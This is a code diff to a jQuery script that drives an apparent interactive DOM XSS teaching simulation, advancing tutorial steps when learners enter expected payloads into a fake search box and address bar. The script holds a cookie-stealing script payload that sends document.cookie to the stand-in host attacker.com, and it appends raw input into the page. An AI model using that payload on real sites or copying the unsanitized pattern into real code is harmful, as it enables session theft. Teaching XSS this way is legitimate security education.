@@ -20,6 +20,92 @@ $(document).ready(function(){
             scrollTop: $('.DOM_XSS .action .tutorial').get(0).scrollHeight
         }, 1500);
     }
+    // search
+    function search(){
+        $(document).on("keypress",".frame .domain",function(e){
+            if(e.which === 13){
+                var search=$(this).val();
+                $(".browser .address").attr({value:"social.com?search="+search});
+                //show step 4 action
+                if(search=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"
+                        && $('.action .tutorial .three').css('display') == 'block'){
+                    $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
+                    $(".DOM_XSS .action .interactive .three").hide(2500);
+                    $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
+                    $(".DOM_XSS .action .interactive .four").fadeIn(2500); 
+                    $(".action .back").removeAttr("id"); //back event 
+                    $(".action .back").attr("id","backthree"); //back event 
+                    $(".action .next").removeAttr("id");
+                    $(".action .next").attr("id","nextfive");
+                    scrollbar();
+                }
+                //show step 2 vulnerability
+                if($('.vulnerability .tutorial .one').css('display') == 'block' && search){
+                    $(".DOM_XSS .vulnerability .tutorial .two").fadeIn(2500); 
+                    $(".vulnerability .back").removeAttr("id");
+                    $(".vulnerability .back").attr("id","backone");
+                    scrollbar();
+                }
+                //show step 3 vulnerability
+                if($('.vulnerability .tutorial .two').css('display') == 'block' && search=="<script>alert(document.cookie)</script>"){
+                    $(".DOM_XSS .vulnerability .tutorial .three").fadeIn(2500); 
+                    $(".DOM_XSS .vulnerability .interactive .two").hide(2500); 
+                    $(".DOM_XSS .vulnerability .interactive .three").fadeIn(2500); 
+                    $(".vulnerability .back").removeAttr("id");
+                    $(".vulnerability .back").attr("id","backtwo");
+                    scrollbar();
+                }
+                //alert 
+                if(search=="<script>alert(document.cookie)</script>"){
+                    search="<script>alert('COOKIE: "+Math.random()+"')</script>";
+                }
+                $(this).append(search);
+            }
+        });
+    };
+    //url 
+    function url(){
+        $(document).on("keypress",".browser .url .address ",function(e){
+            var link=$(this).val();
+            if(e.which === 13 && link.search("search")!==-1){
+                var script=link.slice(18);
+                //show step 4 action
+                if(script=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"
+                        && $('.action .tutorial .three').css('display') == 'block'){
+                    $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
+                    $(".DOM_XSS .action .interactive .three").hide(2500);
+                    $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
+                    $(".DOM_XSS .action .interactive .four").fadeIn(2500); 
+                    $(".action .back").removeAttr("id"); //back event 
+                    $(".action .back").attr("id","backthree"); //back event 
+                    $(".action .next").removeAttr("id");
+                    $(".action .next").attr("id","nextfive");
+                    scrollbar();
+                }
+                //show step 2 vulnerability
+                if($('.vulnerability .tutorial .one').css('display') == 'block' && script){
+                    $(".DOM_XSS .vulnerability .tutorial .two").fadeIn(2500); 
+                    $(".vulnerability .back").removeAttr("id");
+                    $(".vulnerability .back").attr("id","backone");
+                    scrollbar();
+                }
+                 //show step 3 vulnerability
+                 if($('.vulnerability .tutorial .two').css('display') == 'block' && script=="<script>alert(document.cookie)</script>"){
+                    $(".DOM_XSS .vulnerability .tutorial .three").fadeIn(2500); 
+                    $(".DOM_XSS .vulnerability .interactive .two").hide(2500); 
+                    $(".DOM_XSS .vulnerability .interactive .three").fadeIn(2500); 
+                    $(".vulnerability .back").removeAttr("id");
+                    $(".vulnerability .back").attr("id","backtwo");
+                    scrollbar();
+                }
+                //alert 
+                if(script=="<script>alert(document.cookie)</script>"){
+                    script="<script>alert('COOKIE: "+Math.random()+"')</script>";
+                }
+                $(this).append(script);
+            }
+        });
+    };
     // DOM_XSS
 
     //instruction
@@ -128,22 +214,8 @@ $(document).ready(function(){
             //show step 4
                 // back id="backthree"
                 // next id="nextfive"
-                    $(document).on("keypress",".three .browser .url .address ",function(e){
-                        if(e.which === 13){
-                            var script=$(this).val().slice(18);
-                            if(script=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"){
-                                $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
-                                $(".DOM_XSS .action .interactive .three").hide(2500);
-                                $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
-                                $(".DOM_XSS .action .interactive .four").fadeIn(2500); 
-                                $(".action .back").removeAttr("id"); //back event 
-                                $(".action .back").attr("id","backthree"); //back event 
-                                $(".action .next").removeAttr("id");
-                                $(".action .next").attr("id","nextfive");
-                                scrollbar();
-                            }
-                        }
-                    });
+                   search();
+                      url();
             //back to step 3
                 // back id="backtwo"
                 // next id=""
@@ -237,50 +309,117 @@ $(document).ready(function(){
                         $(".action .next").attr("id","nextseven"); //reset back event of step 6
                         scrollbar();
                     });
-        //step switch_vulnerability
-            //show step switch_vulnerability
-                // back id="backsix"
-                // next id="switch_vulnerability"
+
+    //vulnerability
+        // step 1
+            // show step 1
+                // back id="backseven" 
+                // next id=""
                     $(document).on("click",".action #switch_vulnerability",function(){
-                        //$(".DOM_XSS .action .tutorial").hide(); 
+                        //hide action
+                        $(".DOM_XSS .action").hide(); 
                         $(".DOM_XSS .action .tutorial .one").hide(); 
+                        $(".DOM_XSS .action .interactive .one").hide(); 
                         $(".DOM_XSS .action .tutorial .two").hide(); 
+                        $(".DOM_XSS .action .interactive .two").hide(); 
                         $(".DOM_XSS .action .tutorial .three").hide(); 
+                        $(".DOM_XSS .action .interactive .three").hide(); 
                         $(".DOM_XSS .action .tutorial .four").hide(); 
+                        $(".DOM_XSS .action .interactive .four").hide(); 
                         $(".DOM_XSS .action .tutorial .five").hide(); 
                         $(".DOM_XSS .action .tutorial .six").hide(); 
                         $(".DOM_XSS .action .tutorial .seven").hide(); 
-                        $(".DOM_XSS .action .interactive").hide(); 
+                        $(".DOM_XSS .action .interactive .seven").hide(); 
+                        $(".DOM_XSS .action .next").hide(); 
+                        $(".DOM_XSS .action .back").hide(); 
+                        //fadeIn vulnerability
                         $(".DOM_XSS .instruction #inst2").fadeIn(2500).hide(2500);
-                        // $(".action .next").removeAttr("id");
-                        // $(".action .next").attr("id","switch_vulnerability");
-                        // $(".action .back").removeAttr("id"); //back event 
-                        // $(".action .back").attr("id","backsix"); //back event 
+                        $(".DOM_XSS .vulnerability").fadeIn(); 
+                        $(".DOM_XSS .vulnerability .tutorial").fadeIn(2500); //back event  
+                        $(".DOM_XSS .vulnerability .tutorial .one").fadeIn(2500); 
+                        $(".DOM_XSS .vulnerability .interactive").fadeIn(2500); //back event  
+                        $(".DOM_XSS .vulnerability .interactive .one").fadeIn(2500);   
+                        $(".vulnerability .next").fadeIn(); //back event 
+                        $(".vulnerability .back").fadeIn(); 
+                        $(".vulnerability .back").attr("id","backseven"); //back event 
+                        scrollbar();
+
+                    });
+            // back to step 7 action
+                // back id="backsix"
+                // next id="switch_vulnerability"
+                    $(document).on("click",".vulnerability #backseven",function(e){
+                        //hide vulnerability
+                        $(".DOM_XSS .vulnerability").hide(); 
+                        $(".DOM_XSS .vulnerability .tutorial").hide(); //back event  
+                        $(".DOM_XSS .vulnerability .tutorial .one").hide(); 
+                        $(".DOM_XSS .vulnerability .interactive").hide(); //back event  
+                        $(".DOM_XSS .vulnerability .interactive .one").hide();   
+                        $(".vulnerability .next").hide(); //back event 
+                        $(".vulnerability .back").hide(); 
+                        //fadeIn action
+                        $(".DOM_XSS .action").fadeIn(2500);
+                        $(".action .next").attr("disabled","").attr("title","Disabled"); // not next event
+                        $(".DOM_XSS .action .tutorial").fadeIn(2500); //back event  
+                        $(".DOM_XSS .action .tutorial .one").fadeIn(2500); 
+                        $(".DOM_XSS .action .tutorial .two").fadeIn(2500); 
+                        $(".DOM_XSS .action .tutorial .three").fadeIn(2500); 
+                        $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
+                        $(".DOM_XSS .action .tutorial .five").fadeIn(2500); 
+                        $(".DOM_XSS .action .tutorial .six").fadeIn(2500); 
+                        $(".DOM_XSS .action .tutorial .seven").fadeIn(2500); 
+                        $(".DOM_XSS .action .interactive").fadeIn(2500); //back event  
+                        $(".DOM_XSS .action .interactive .seven").fadeIn(2500); 
+                        $(".action .next").removeAttr("disabled").fadeIn(); //back event 
+                        $(".action .back").fadeIn(); //back event 
+                        //set id back next
+                        $(".action .back").removeAttr("id"); //back event 
+                        $(".action .back").attr("id","backsix"); //back event 
+                        $(".action .next").removeAttr("id"); //back event 
+                        $(".action .next").attr("id","switch_vulnerability"); //back event 
+                        scrollbar();
+
+                    });
+        // step 2
+            // show step 2
+                // back id="backone"
+                // next id=""
+                // used on show step 4 action: search();
+                // used on show step 4 action: url();
+
+
+            // back to step 1
+                // back id="backseven" (action)
+                // next id=""
+                    $(document).on("click",".vulnerability #backone",function(e){
+                        $(".DOM_XSS .vulnerability .tutorial .two").hide(2500); 
+                        $(".vulnerability .back").removeAttr("id"); //back event 
+                        $(".vulnerability .back").attr("id","backseven"); //back event 
+                        scrollbar();
                     });
 
-        
-
-    //vulnerability
-    $(document).on("keypress",".frame .domain",function(e){
-        if(e.which === 13){
-            var search=$(this).val();
-            $(".browser .address").attr({value:"social.com?search="+search});
-            $(".DOM_XSS .action .tutorial .two").fadeIn(2500);
-            if(search=="<script>alert(document.cookie)</script>"){
-                search="<script>alert('COOKIE: "+Math.random()+"')</script>";
-                $(".DOM_XSS .action .tutorial .three").fadeIn(2500);
-            }
-            $(this).append(search);
-        }
     
+        //step 3
+            //show step 3
+                // back id="backtwo"
+                // next id=""
+                // used on show step 4 action: search();
+                // used on show step 4 action: url();
+
+            // back to step 2
+                // back id="backone" (action)
+                // next id=""
+                    $(document).on("click",".vulnerability #backtwo",function(e){
+                        $(".DOM_XSS .vulnerability .tutorial .three").hide(2500); 
+                        $(".DOM_XSS .vulnerability .interactive .three").hide(2500); 
+                        $(".DOM_XSS .vulnerability .interactive .two").fadeIn(2500); 
+                        $(".vulnerability .back").removeAttr("id"); //back event 
+                        $(".vulnerability .back").attr("id","backone"); //back event 
+                        scrollbar();
+                    });
     //prevent
 
     
-
-
-});
-//one page
-
 
 
 });
